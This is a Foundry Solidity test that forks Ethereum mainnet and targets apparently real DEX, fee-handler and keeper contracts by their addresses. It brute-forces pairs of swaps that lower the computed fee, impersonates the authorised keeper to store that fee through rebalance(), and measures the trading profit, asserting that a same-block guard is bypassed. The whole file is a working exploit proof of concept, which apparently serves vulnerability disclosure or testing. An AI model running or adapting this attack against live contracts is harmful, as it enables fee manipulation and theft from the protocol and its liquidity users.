// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.21;

import {Test} from "forge-std/Test.sol";

interface IERC20FeeV2 {
    function approve(address spender, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
}

interface IDexFeeV2 {
    function swapIn(bool swap0to1, uint256 amountIn, uint256 amountOutMin, address to)
        external payable returns (uint256 amountOut);
}

interface IFeeHandlerV2 {
    function currentConfig() external view returns (uint256);
    function newConfig() external view returns (uint256);
    function getDexVariables() external view returns (uint256, uint256, uint256);
    function rebalance() external;
}

interface IReserveFeeV2 {
    function isRebalancer(address user) external view returns (bool);
}

contract DexFeeCurrentKeeperBypassV2Test is Test {
    address constant DEX = 0xf063BD202E45d6b2843102cb4EcE339026645D4a;
    address constant HANDLER = 0x49EF1B3230a8d2AC7205E808dF5859f1b94D61Df;
    address constant RESERVE = 0x264786EF916af64a1DB19F513F24a3681734ce92;
    address constant KEEPER = 0x70FfF8874e46b928d5d100512743e312a7025feA;
    address constant USDE = 0x4c9EDD5852cd905f086C759E8383e09bff1E68B3;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    uint256 constant START_USDE = 2_000_000e18;
    uint256 constant START_USDT = 2_000_000e6;

    bool bestD1;
    bool bestD2;
    uint256 bestA1;
    uint256 bestA2;
    uint256 bestFee = type(uint256).max;

    event Best(bool firstDirection, uint256 firstAmount, bool secondDirection, uint256 secondAmount, uint256 fee);
    event Result(
        uint256 honestSameBlockFee,
        uint256 manipulatedFee,
        uint256 persistedFee,
        int256 baselinePnlRawUSDT,
        int256 manipulatedPnlRawUSDT,
        int256 improvementRawUSDT
    );

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), vm.envUint("MAINNET_FORK_BLOCK"));
        assertTrue(IReserveFeeV2(RESERVE).isRebalancer(KEEPER), "keeper unauthorized");
        deal(USDE, address(this), START_USDE);
        deal(USDT, address(this), START_USDT);
        IERC20FeeV2(USDE).approve(DEX, type(uint256).max);
        IERC20FeeV2(USDT).approve(DEX, type(uint256).max);
    }

    function _value() internal view returns (uint256) {
        return IERC20FeeV2(USDE).balanceOf(address(this)) / 1e12 + IERC20FeeV2(USDT).balanceOf(address(this));
    }

    function _a1(uint256 i, bool direction) internal pure returns (uint256) {
        uint256[7] memory whole = [uint256(1), 10, 100, 1_000, 10_000, 50_000, 100_000];
        return whole[i] * (direction ? 1e18 : 1e6);
    }

    function _a2(uint256 i, bool direction) internal pure returns (uint256) {
        uint256[6] memory whole = [uint256(1), 10, 100, 1_000, 100_000, 1_000_000];
        return whole[i] * (direction ? 1e18 : 1e6);
    }

    function tryPair(bool d1, uint256 a1, bool d2, uint256 a2) external returns (uint256 fee) {
        require(msg.sender == address(this), "self only");
        IDexFeeV2(DEX).swapIn(d1, a1, 0, address(this));
        IDexFeeV2(DEX).swapIn(d2, a2, 0, address(this));
        fee = IFeeHandlerV2(HANDLER).newConfig();
    }

    function _search() internal {
        for (uint256 x; x < 2; x++) {
            bool d1 = x == 0;
            for (uint256 i; i < 7; i++) {
                for (uint256 y; y < 2; y++) {
                    bool d2 = y == 0;
                    for (uint256 j; j < 6; j++) {
                        uint256 snap = vm.snapshot();
                        uint256 a1 = _a1(i, d1);
                        uint256 a2 = _a2(j, d2);
                        try this.tryPair(d1, a1, d2, a2) returns (uint256 fee) {
                            vm.revertTo(snap);
                            if (fee < bestFee) {
                                bestFee = fee;
                                bestD1 = d1;
                                bestD2 = d2;
                                bestA1 = a1;
                                bestA2 = a2;
                                emit Best(d1, a1, d2, a2, fee);
                            }
                        } catch {
                            vm.revertTo(snap);
                        }
                    }
                }
            }
        }
        assertLt(bestFee, type(uint256).max, "no executable pair");
    }

    function _closeInventory() internal {
        uint256 usde = IERC20FeeV2(USDE).balanceOf(address(this));
        uint256 usdt = IERC20FeeV2(USDT).balanceOf(address(this));
        if (usde < START_USDE && usdt > START_USDT) {
            IDexFeeV2(DEX).swapIn(false, usdt - START_USDT, 0, address(this));
        } else if (usdt < START_USDT && usde > START_USDE) {
            IDexFeeV2(DEX).swapIn(true, usde - START_USDE, 0, address(this));
        }
    }

    function _cycle(bool persist) internal returns (int256 pnl, uint256 configuredFee) {
        uint256 beforeValue = _value();
        IDexFeeV2(DEX).swapIn(bestD1, bestA1, 0, address(this));
        IDexFeeV2(DEX).swapIn(bestD2, bestA2, 0, address(this));
        if (persist) {
            vm.prank(KEEPER);
            IFeeHandlerV2(HANDLER).rebalance();
        }
        configuredFee = IFeeHandlerV2(HANDLER).currentConfig();
        _closeInventory();
        pnl = int256(_value()) - int256(beforeValue);
    }

    function test_currentKeeper_canPersistTwoSwapControlledFee() public {
        uint256 honestFee = IFeeHandlerV2(HANDLER).newConfig();
        _search();

        uint256 snap = vm.snapshot();
        (int256 baselinePnl,) = _cycle(false);
        vm.revertTo(snap);

        (int256 manipulatedPnl, uint256 persistedFee) = _cycle(true);
        emit Result(honestFee, bestFee, persistedFee, baselinePnl, manipulatedPnl, manipulatedPnl - baselinePnl);

        assertLt(bestFee, honestFee, "same-block guard not bypassed");
        assertEq(persistedFee, bestFee, "manipulated fee not persisted");
    }
}
